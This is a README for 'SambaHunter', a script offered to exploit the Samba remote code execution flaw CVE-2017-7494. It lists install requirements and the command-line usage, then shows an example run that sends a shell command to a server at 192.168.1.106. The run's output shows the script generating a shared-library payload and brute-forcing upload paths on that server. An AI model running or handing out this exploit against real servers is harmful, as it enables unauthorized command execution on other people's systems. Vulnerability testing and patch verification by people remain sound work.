# SambaHunter
It is a simple script to exploit RCE for Samba (CVE-2017-7494).

# Requirements
* sudo apt-get install smbclient
* pip install pysmbclient

# Usage
```
# python sambahunter.py -h


  ____                  _           _   _             _            
 / ___|  __ _ _ __ ___ | |__   __ _| | | |_   _ _ __ | |_ ___ _ __ 
 \___ \ / _` | '_ ` _ \| '_ \ / _` | |_| | | | | '_ \| __/ _ \ '__|
  ___) | (_| | | | | | | |_) | (_| |  _  | |_| | | | | ||  __/ |   
 |____/ \__,_|_| |_| |_|_.__/ \__,_|_| |_|\__,_|_| |_|\__\___|_|   
                                                                   
    # Exploit Author: avfisher (https://github.com/brianwrf)
    # Samba 3.5.0 - 4.5.4/4.5.10/4.4.14 Remote Code Execution
    # CVE-2017-7494
    # Help: python sambahunter.py -h

usage: sambahunter.py [-h] [-s SERVER] [-c COMMAND]

optional arguments:
  -h, --help            show this help message and exit
  -s SERVER, --server SERVER
                        Server to target
  -c COMMAND, --command COMMAND
                        Command to execute on target server
 ```
 
 # Example
 ```
 # python sambahunter.py -s 192.168.1.106 -c 'uname -a > /tmp/u.txt'


  ____                  _           _   _             _            
 / ___|  __ _ _ __ ___ | |__   __ _| | | |_   _ _ __ | |_ ___ _ __ 
 \___ \ / _` | '_ ` _ \| '_ \ / _` | |_| | | | | '_ \| __/ _ \ '__|
  ___) | (_| | | | | | | |_) | (_| |  _  | |_| | | | | ||  __/ |   
 |____/ \__,_|_| |_| |_|_.__/ \__,_|_| |_|\__,_|_| |_|\__\___|_|   
                                                                   
    # Exploit Author: avfisher (https://github.com/brianwrf)
    # Samba 3.5.0 - 4.5.4/4.5.10/4.4.14 Remote Code Execution
    # CVE-2017-7494
    # Help: python sambahunter.py -h

[*] Exploiting RCE for Samba (CVE-2017-7494 )...
[*] Server: 192.168.1.106
[*] Samba version: Samba 4.3.8-Ubuntu
[*] Generate payload succeed: /root/samba_14506.so
[+] Brute force exploit: /volume1/samba_14506.so
[+] Brute force exploit: /volume2/samba_14506.so
[+] Brute force exploit: /volume3/samba_14506.so
[+] Brute force exploit: /shared/samba_14506.so
[+] Brute force exploit: /mnt/samba_14506.so
[+] Brute force exploit: /mnt/usb/samba_14506.so
[+] Brute force exploit: /media/samba_14506.so
[+] Brute force exploit: /mnt/media/samba_14506.so
[+] Brute force exploit: /var/samba/samba_14506.so
[+] Brute force exploit: /tmp/samba_14506.so
[+] Brute force exploit: /home/samba_14506.so
[+] Brute force exploit: /home/shared/samba_14506.so
[*] Exploit finished!
 ```
